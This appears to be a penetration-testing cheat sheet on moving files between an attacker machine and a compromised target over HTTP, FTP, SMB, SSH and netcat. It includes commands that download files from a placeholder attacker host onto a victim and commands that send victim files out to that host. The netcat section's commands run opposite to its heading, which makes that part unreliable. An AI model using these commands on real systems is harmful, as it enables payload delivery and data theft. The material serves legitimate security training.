# Transfert file between target and attacking machines

## HTTP

### From attack machine to Target

#### Attacking machine

- In kali we can use python `python -m http.server 80`

#### Target machine

- On a win target machine you can access it directly with the browser: `http://IP-ATTACKING-MACHINE/FILE-TO-GET` or you can use certutil.exe `certutil.exe -urlcache http://IP-ATTACKING-MACHINE/FILE-TO-GET file-to-get`
- In a linux target machine you can use `wget http://IP-ATTACKING-MACHINE/FILE-TO-GET` or curl `curl -o FILE-TO-GET http://IP-ATTACKING-MACHINE/FILE-TO-GET`

## FTP

### From attack machine to target

#### Attacking machine

- `python3 -m pyftpdlib -p 21 --write`

####  Target machine

- `ftp IP-OF-ATTACKING-MACHINE` we can then use `get filename` to get the file

### From Target to attack

#### Attacking machine

- `python3 -m pyftpdlib -p 21 --write`

####  Target machine

- `ftp IP-OF-ATTACKING-MACHINE` we can then use `put filename` to send the file

## SMB

### From Target to attack machine

#### Attacking machine

- In kali we can use Impacket `python3 smbserver.py -smb2support sharename /path/folder`

#### Target machine

- In a win victim machine we just need to copy the file to the attacking machine: `copy  FiletoDownload \\IP-OFF-ATTACKING-MACHINE\SHARENAME`

## Metasploit

### From attack machine to Target

There is an upload and download feature

## SSH (creds needed)

### From attack machine to Target

- In your kali or any linux `scp FILE-TO-SEND user@ip:/path/to/folder`

## Netcat

### From Target to attack machine

#### Target machine

- `nc -lvp PORT-NUMBER > FILE-TO-SEND

#### Attacking machine

- `nc VICTIM-IP PORT-NUMBER -w 3 < FILE` note: -w is for the time out in seconds


## Resources

{% embed url="https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/" %} Transfer files (Post explotation) – CheatSheet - PABLO PLAZA MARTÍNEZ {% endembed %}
